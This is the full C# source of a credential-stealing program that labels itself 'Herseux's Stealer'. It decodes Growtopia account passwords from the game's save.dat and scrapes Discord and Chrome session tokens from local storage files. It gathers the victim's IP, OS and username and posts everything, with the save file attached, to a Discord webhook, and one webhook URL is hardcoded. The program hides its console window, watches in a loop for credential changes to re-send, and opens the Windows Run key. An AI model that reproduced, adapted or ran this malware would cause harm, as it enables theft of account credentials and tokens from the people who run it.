using System;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Threading;
using System.Text;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Drawing;
using System.Management;
using Dcc;

namespace Herseux
{
    class Webhook
    {
        private HttpClient Client;
        private string Url;

        public string Name { get; set; }
        public string ProfilePictureUrl { get; set; }

        public Webhook(string webhookUrl)
        {
            Client = new HttpClient();
            Url = webhookUrl;
        }

        public bool SendMessage(string content, string file = null)
        {
            MultipartFormDataContent data = new MultipartFormDataContent();
            data.Add(new StringContent(Name), "username");
            data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
            data.Add(new StringContent(content), "content");

            if (file != null)
            {
                if (!File.Exists(file))
                    throw new FileNotFoundException();

                byte[] bytes = File.ReadAllBytes(file);

                data.Add(new ByteArrayContent(bytes), "save.dat", "save.dat"); //change "file" to "file.(extention) if you wish to download as ext
            }

            var resp = Client.PostAsync(Url, data).Result;

            return resp.StatusCode == HttpStatusCode.NoContent;
        }
    }

    public class PasswordDec
    {
        public List<string> PPW(byte[] contents)
        {
            List<string> result;
            try
            {
                string text = "";
                for (int i = 0; i < contents.Length; i += 1)
                {
                    byte b = contents[i];
                    string text2 = b.ToString("X2");
                    bool flag = text2 == "00";
                    if (flag)
                    {
                        text += "<>";
                    }
                    else
                    {
                        text += text2;
                    }
                }
                bool flag2 = text.Contains("74616E6B69645F70617373776F7264");
                if (flag2)
                {
                    string text3 = "74616E6B69645F70617373776F7264";
                    int num = text.IndexOf(text3);
                    int num2 = text.LastIndexOf(text3);
                    bool flag3 = false;
                    string text4;
                    if (flag3)
                    {
                        text4 = string.Empty;
                    }
                    num += text3.Length;
                    int num3 = text.IndexOf("<><><>", num);
                    bool flag4 = false;
                    if (flag4)
                    {
                        text4 = string.Empty;
                    }

                    string @string = Encoding.UTF8.GetString(StringToByteArray(text.Substring(num, num3 - num).Trim()));
                    bool flag5 = ((@string.ToCharArray()[0] == 95) ? 1 : 0) == 0;
                    if (flag5)
                    {
                        text4 = text.Substring(num, num3 - num).Trim();
                    }
                    else
                    {
                        num2 += text3.Length;
                        num3 = text.IndexOf("<><><>", num2);
                        text4 = text.Substring(num2, num3 - num2).Trim();
                    }
                    string text5 = "74616E6B69645F70617373776F7264" + text4 + "<><><>";
                    int num4 = text.IndexOf(text5);
                    bool flag6 = false;
                    string text6;
                    if (flag6)
                    {
                        text6 = string.Empty;
                    }
                    num4 += text5.Length;
                    int num5 = text.IndexOf("<><><>", num4);
                    bool flag7 = false;
                    if (flag7)
                    {
                        text6 = string.Empty;
                    }

                    text6 = text.Substring(num4, num5 - num4).Trim();
                    int num6 = StringToByteArray(text4)[0];
                    text6 = text6.Substring(0, num6 * 2);
                    byte[] array = StringToByteArray(text6.Replace("<>", "00"));
                    List<byte> list = new List<byte>();
                    List<byte> list2 = new List<byte>();
                    byte b2 = (byte)(48 - array[0]);
                    byte[] array2 = array;
                    for (int j = 0; j < array2.Length; j += 1)
                    {
                        byte b3 = array2[j];
                        list.Add((byte)(b2 + b3));
                    }
                    for (int k = 0; k < list.Count; k += 1)
                    {
                        list2.Add((byte)(list[k] - 1 - k));
                    }
                    List<string> list3 = new List<string>();
                    int num7 = 0;
                    while ((num7 > 255 ? 1 : 0) == 0)
                    {
                        string text7 = "";
                        foreach (byte b4 in list2)
                        {
                            bool flag8 = ValidateChar((char)((byte)((int)b4 + num7)));
                            if (flag8)
                            {
                                text7 += ((char)((byte)((int)b4 + num7))).ToString();
                            }
                        }
                        bool flag9 = text7.Length == num6;
                        if (flag9)
                        {
                            list3.Add(text7);
                        }
                        num7 += 1;
                    }
                    result = list3;
                }
                else
                {
                    result = null;
                }
            }
            catch
            {
                result = null;
            }
            return result;
        }
        public byte[] StringToByteArray(string str)
        {
            Dictionary<string, byte> hexindex = new Dictionary<string, byte>();
            for (int i = 0; i <= 255; i++)
                hexindex.Add(i.ToString("X2"), (byte)i);

            List<byte> hexres = new List<byte>();
            for (int i = 0; i < str.Length; i += 2)
                hexres.Add(hexindex[str.Substring(i, 2)]);

            return hexres.ToArray();
        }
        private bool ValidateChar(char cdzdshr)
        {
            if ((cdzdshr >= 0x30 && cdzdshr <= 0x39) ||
                    (cdzdshr >= 0x41 && cdzdshr <= 0x5A) ||
                    (cdzdshr >= 0x61 && cdzdshr <= 0x7A) ||
                    (cdzdshr >= 0x2B && cdzdshr <= 0x2E)) return true;
            else return false;
        }

        public string[] Func(byte[] lel)
        {
            byte[] buff = lel;
            var passwords = PPW(buff);
            return passwords.ToArray();
        }
    }

    class Herseux
    {
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        class Program
        {
            [DllImport("kernel32.dll")]
            static extern IntPtr GetConsoleWindow();
            [DllImport("user32.dll")]
            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            const int SW_HIDE = 0;
            const int SW_SHOW = 5;
            public static string savePath()
            {
                try
                {
                    RegistryKey gtreg;
                    if (Environment.Is64BitOperatingSystem)
                    {
                        gtreg = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                    }
                    else
                    {
                        gtreg = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
                    }
                    try
                    {
                        gtreg = gtreg.OpenSubKey(@"Software\Growtopia", true);
                        string pathvalue = (string)gtreg.GetValue("path");
                        if (Directory.Exists(pathvalue))
                        {
                            if (File.Exists(pathvalue + @"\save.dat"))
                            {
                                string sdat = null;
                                var r = File.Open(pathvalue + @"\save.dat", FileMode.Open, FileAccess.Read, FileShare.Read);
                                using (FileStream fileStream = new FileStream(pathvalue + @"\save.dat", FileMode.Open, FileAccess.Read, FileShare.Read))
                                {
                                    using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                                    {
                                        sdat = streamReader.ReadToEnd();
                                        streamReader.Close();
                                    }
                                    r.Close();
                                    fileStream.Close();
                                }

                                if (sdat.Contains("tankid_password") & sdat.Contains("tankid_name"))
                                {
                                    return pathvalue + @"\save.dat";
                                }
                                else
                                {
                                    return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                                }
                            }
                            else
                            {
                                return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                            }

                        }
                        else
                        {
                            return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                        }
                    }
                    catch
                    {
                        return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                    }
                }
                catch
                {
                    return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                }
            }
            static string old;
            static void LogGonder()
            {
                byte[] array = File.ReadAllBytes(savePath());
                string @string = Encoding.ASCII.GetString(array);
                string result;

                try
                {
                    string text = @string.Substring(@string.IndexOf("tankid_name") + 15, Convert.ToInt32(array[@string.IndexOf("tankid_name") + 11]));
                    result = text;
                }
                catch
                {
                    result = "Null";

                }
                var pattern = new Regex(@"[^\w0-9]");
                string savedata = null;
                var r = File.Open(savePath(), FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                using (FileStream fileStream = new FileStream(savePath(), FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                    {
                        savedata = streamReader.ReadToEnd();
                    }
                }
                Webhook hook = new Webhook("https://discordapp.com/api/webhooks/712590258000101386/Yn6IXAUtJUNsC6hPzqJme0jZow3RO2LlZxWluN4DDoeCG29bH32wxUVBi1B7cwdv98F1");
                hook.Name = "Herseux's Stealer";
                hook.ProfilePictureUrl = "https://cdn.discordapp.com/attachments/704804403915259954/705046344842215596/asdfsdghg.png";
                string details;
                details = "CHANGED";
                details = details + "PC Name: " + Environment.UserName;
                details = details + Environment.NewLine;
                details = details + "GrowId: " + result;
                hook.SendMessage(details, savePath());
            }
            static string CheckRealTimeSavedat()
            {
                string savedat = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Growtopia\Save.dat";
                var pattern = new Regex(@"[^\w0-9]");
                string savedata = null;
                var r = File.Open(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                using (FileStream fileStream = new FileStream(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                    {
                        savedata = streamReader.ReadToEnd();
                    }
                }

                string cleardata = savedata.Replace("\u0000", " ");
                string firstgrowid = pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
                string growid = "Growid: " + pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
                string lastworld = "Last World: " + pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(' ')[3], string.Empty);
                string[] passwords = new PasswordDec().Func(Encoding.Default.GetBytes(savedata));
                string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Windows\" + firstgrowid + ".txt";
                string finalpass = "";
                for (int z = 0; z < passwords.Length; z++)
                {
                    finalpass += passwords[z] + " ";
                }
                // Console.WriteLine(growid+" " +finalpass);
                //  Console.WriteLine(growid+" "+finalpass);
                return growid + " " + finalpass;
            }
            static void DosyayiOlustur(string path, string growid, string passwords, string value)
            {
                try
                {
                    string[] splitted = passwords.Split(' ');
                    FileStream fstream = new FileStream(path, FileMode.OpenOrCreate, FileAccess.ReadWrite);
                    StreamWriter writer = new StreamWriter(fstream);
                    writer.WriteLine(growid);
                    foreach (var sonsifre in splitted)
                    {
                        if (!String.IsNullOrEmpty(sonsifre))
                        {
                            writer.WriteLine(sonsifre);
                        }

                    }
                    writer.Close();
                    fstream.Close();
                    Console.WriteLine(value);
                }
                catch
                {

                }

            }
            static string FinalControl(string growid, string ilkgrowid, string path, string pass)
            {
                string data1 = CheckRealTimeSavedat();
                string data2 = CheckSavedat(growid);
                if (data1 == data2)
                {
                    Console.WriteLine("Doğru");
                }
                else if (data1 != data2)
                {
                    Console.WriteLine("Değişti!");
                    DosyayiOlustur(path, ilkgrowid, pass, "Degisti!");
                    LogGonder();
                }
                return null;
            }
            static string CheckSavedat(string username)
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Windows\" + username + ".txt";
                string[] a = File.ReadAllLines(path);
                string log = "";
                for (int i = 0; i < a.Length; i++)
                {
                    log += a[i] + " ";
                }
                //Console.WriteLine(log);
                return log;
            }
            static void TimerBasla(int interval)
            {
                System.Threading.Timer t = new System.Threading.Timer(TimerCallback, null, 0, interval);
            }
            private static void TimerCallback(Object o)
            {
                while (true)
                {
                    string savedat = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Growtopia\Save.dat";
                    var pattern = new Regex(@"[^\w0-9]");
                    string savedata = null;
                    var r = File.Open(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                    using (FileStream fileStream = new FileStream(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                        {
                            savedata = streamReader.ReadToEnd();
                        }
                    }

                    string cleardata = savedata.Replace("\u0000", " ");
                    string firstgrowid = pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
                    string growid = "Growid: " + pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
                    string lastworld = "Last World: " + pattern.Replace(cleardata.Substring(cleardata.IndexOf("lastworld") + "lastworld".Length).Split(' ')[3], string.Empty);
                    string[] passwords = new PasswordDec().Func(Encoding.Default.GetBytes(savedata));
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Windows\" + firstgrowid + ".txt";
                    string finalpass = "";
                    for (int z = 0; z < passwords.Length; z++)
                    {
                        finalpass += " " + passwords[z];
                    }
                    if (!File.Exists(path))
                    {
                        DosyayiOlustur(path, growid, finalpass, "Olustu!");
                        LogGonder();
                    }
                    else
                    {
                        //CheckRealTimeSavedat();
                        //string log1 = CheckSavedat(firstgrowid);
                        string log1 = FinalControl(firstgrowid, growid, path, finalpass);
                        Console.WriteLine(log1);
                    }
                    Thread.Sleep(2000);

                }
            }
            private static string tokenx(string stringx, bool boolx = false)
            {
                byte[] bytes = File.ReadAllBytes(stringx);
                string @string = Encoding.UTF8.GetString(bytes);
                string string1 = "";
                string string2 = @string;
                while (string2.Contains("oken"))
                {
                    string[] array = IndexOf(string2).Split(new char[]
                    {
                    '"'
                    });
                    string1 = array[0];
                    string2 = string.Join("\"", array);
                    if (boolx && string1.Length == 59)
                    {
                        break;
                    }
                }
                return string1;
            }
            private static bool dotldb(ref string stringx)
            {
                if (Directory.Exists(stringx))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                    {
                        if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                        {
                            stringx += fileInfo.Name;
                            return stringx.EndsWith(".ldb");
                        }
                    }
                    return stringx.EndsWith(".ldb");
                }
                return false;
            }
            private static string IndexOf(string stringx)
            {
                string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
                {
                '"'
                });
                List<string> list = new List<string>();
                list.AddRange(array);
                list.RemoveAt(0);
                array = list.ToArray();
                return string.Join("\"", array);
            }
            public static string GetLastWorld()
            {
                try
                {
                    string str1 = (string)null;
                    System.IO.File.Open(savePath(), FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                    using (FileStream fileStream = new FileStream(savePath(), FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        using (StreamReader streamReader = new StreamReader((Stream)fileStream, Encoding.Default))
                            str1 = streamReader.ReadToEnd();
                    }
                    Regex regex = new Regex("[^\\w0-9]");
                    string str2 = str1.Replace("\0", " ");
                    return regex.Replace(str2.Substring(str2.IndexOf("lastworld") + "lastworld".Length).Split(' ')[3], string.Empty) ?? "Not Found";
                }
                catch
                {
                    return "";
                }

            }
            private static bool dotlog(ref string stringx)
            {
                if (Directory.Exists(stringx))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                    {
                        if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                        {
                            stringx += fileInfo.Name;
                            return stringx.EndsWith(".log");
                        }
                    }
                    return stringx.EndsWith(".log");
                }
                return false;
            }
            public static string GetIPAddress()
            {
                string IPADDRESS = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
                return IPADDRESS;
            }

            static void Main(string[] args)
            {
                Discord.Reference();
                #region grabbing token
                string string1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
                if (!dotldb(ref string1) && !dotldb(ref string1))
                {
                }
                System.Threading.Thread.Sleep(100);
                string string2 = tokenx(string1, string1.EndsWith(".log"));
                if (string2 == "")
                {
                    string2 = "N/A";
                }

                string string3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
                if (!dotldb(ref string3) && !dotlog(ref string3))
                {
                }
                System.Threading.Thread.Sleep(100);
                string string4 = tokenx(string3, string3.EndsWith(".log"));
                if (string4 == "")
                {
                    string4 = "N/A";
                }
                #endregion
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);

                int delaytocheck = 1000;
                System.Threading.Timer t = new System.Threading.Timer(TimerCallback, null, 0, delaytocheck);
                string savedat = savePath();
                string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Documents";
                DirectoryInfo directory = new DirectoryInfo(path);
                if (!File.Exists(path))
                {
                    directory.Create();
                }
                byte[] array = File.ReadAllBytes(savePath());
                string @string = Encoding.ASCII.GetString(array);
                string result;

                try
                {
                    string text = @string.Substring(@string.IndexOf("tankid_name") + 15, Convert.ToInt32(array[@string.IndexOf("tankid_name") + 11]));
                    result = text;
                }
                catch
                {
                    result = "Null";

                }
                var pattern = new Regex(@"[^\w0-9]");
                string savedata = null;
                var r = File.Open(savePath(), FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                using (FileStream fileStream = new FileStream(savePath(), FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                    {
                        savedata = streamReader.ReadToEnd();
                    }
                }
                string cleardata = savedata.Replace("\u0000", " ");
                bool premium = false;
                if (pattern.Replace(cleardata.Substring(cleardata.IndexOf("premium_subscription") + "premium_subscription".Length).Split(' ')[3], string.Empty) == "")
                {
                    premium = false;

                }
                else
                {
                    premium = true;
                }
                DateTime time = DateTime.Now;
                ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                foreach (ManagementObject managementObject in mos.Get())
                {
                    String OSName = managementObject["Caption"].ToString();
                    Webhook hook = new Webhook("YOUR WEBHOOK"); //CHANGE HERE
                    hook.Name = "Herseux's Stealer";
                    hook.ProfilePictureUrl = "https://cdn.discordapp.com/attachments/704804403915259954/705046344842215596/asdfsdghg.png";
                    string details;
                    details = "✦ PC Name: " + Environment.UserName;
                    details = details + Environment.NewLine;
                    details = details + "✦ GrowID: " + result;
                    details = details + "\n✦ Last World: " + GetLastWorld();
                    details = details + "\n✦ Premium: " + premium;
                    details = details + "\n✦ IP: " + GetIPAddress();
                    details = details + "\n✦ OS: " + OSName;
                    details = details + "\n✦ Token DiscordAPP: " + string2;
                    details = details + "\n✦ Token Chrome: " + string4;
                    details = details + "\n✦ Date Time: " + time.ToString("h:mm:ss tt");
                    details = details +
                    hook.SendMessage(details, savePath());

                }
                RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                TimerBasla(4000); //TRACE SAVEDAT
                Console.ReadKey();
            }
        }
    }
}

